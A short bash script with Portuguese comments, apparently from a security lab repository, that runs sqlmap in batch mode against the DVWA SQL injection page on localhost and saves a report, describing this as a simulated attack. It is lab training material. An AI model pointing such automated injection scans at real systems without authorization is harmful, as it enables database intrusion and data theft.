#!/bin/bash

echo "🎯 Iniciando simulação de SQL Injection com sqlmap..."

# URL de exemplo - altere para o ambiente DVWA no seu host local ou Docker
TARGET="http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit#"

# Caminho para output
OUTPUT="plays/sqlmap-injection/sqlmap-report.txt"

# Comando
sqlmap -u "$TARGET" --batch --level=2 --risk=2 --random-agent --output-dir=plays/sqlmap-injection -o > "$OUTPUT"

echo "✅ Ataque simulado. Relatório gerado em: $OUTPUT"
